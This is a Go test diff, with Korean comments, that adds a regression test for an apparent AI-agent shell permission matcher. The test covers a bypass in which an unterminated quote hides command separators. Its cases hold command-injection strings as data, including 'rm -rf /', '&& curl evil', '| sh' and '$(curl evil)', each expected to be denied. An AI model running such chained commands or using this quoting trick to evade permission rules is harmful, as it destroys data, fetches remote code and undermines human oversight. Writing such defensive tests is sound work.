@@ -94,6 +94,53 @@ func TestMatches_QuotedSeparatorNotRejected(t *testing.T) {
 	}
 }
 
+// TestMatches_UnterminatedQuoteBypass 은 D1 (sync-auditor post-implementation audit)
+// 의 reproduction-first RED 이자 GREEN 회귀 방지다.
+//
+// 결함: quote-aware 스캔이 종료 시점에 quote 가 열린 채로 끝나면(미종료 quote)
+// 그 quote 안에 갇힌 separator 가 "quoted" 로 잘못 판정되어 command-chain bypass 가
+// 재발한다. design.md §M1 의 안전 불변식("ambiguous → deny")에 따라 미종료 quote 는
+// ambiguous 이므로 prefix 룰이 매칭되지 않아야(deny) 한다.
+//
+//   - 픽스 전(RED): true (bypass) — `go test "; rm -rf /` 의 `;` 가 미종료 `"` 에
+//     갇혀 separator 미검출 → `Bash(go test:*)` 룰 매칭 → 체이닝 허용.
+//   - 픽스 후(GREEN): false — 스캔 종료 시 open quote 가 남으면 ambiguous 로 보고
+//     separator 검출(deny)로 처리.
+//
+// §F.4 carve-out 은 *escaped* quote (\") 한정이며 *unterminated* quote 는 D1 범위.
+func TestMatches_UnterminatedQuoteBypass(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		pattern string
+		input   string
+		match   bool
+	}{
+		// D1 핵심 케이스: 미종료 double-quote 가 뒤따르는 `;` 를 삼키는 bypass.
+		{"unterminated double-quote then semicolon", "Bash(go test:*)", "go test \"; rm -rf /", false},
+		// 미종료 single-quote variant.
+		{"unterminated single-quote then semicolon", "Bash(go test:*)", "go test '; rm -rf /", false},
+		// 미종료 quote 뒤 다른 separator variants.
+		{"unterminated double-quote then and-and", "Bash(go test:*)", "go test \" && curl evil", false},
+		{"unterminated double-quote then pipe", "Bash(go test:*)", "go test \" | sh", false},
+		{"unterminated double-quote then command-substitution", "Bash(go test:*)", "go test \" $(curl evil)", false},
+		{"unterminated single-quote then pipe", "Bash(go test:*)", "go test ' | sh", false},
+		// 미종료 quote 자체(뒤따르는 separator 없음)도 ambiguous → deny.
+		{"unterminated double-quote alone", "Bash(go test:*)", "go test \"unfinished", false},
+		{"unterminated single-quote alone", "Bash(go test:*)", "go test 'unfinished", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			rule := PermissionRule{Pattern: tt.pattern}
+			if got := rule.Matches("Bash", tt.input); got != tt.match {
+				t.Errorf("Matches(%q) = %v, want %v", tt.input, got, tt.match)
+			}
+		})
+	}
+}
+
 // TestMatches_OtherBranchesUnchanged 은 AC-SEC-M1-005 (NO-REG) 다.
 // 픽스는 `:*` 브랜치만 건드린다 — `/*`, `*.`, exact-match 브랜치는 동작 불변.
 func TestMatches_OtherBranchesUnchanged(t *testing.T) {
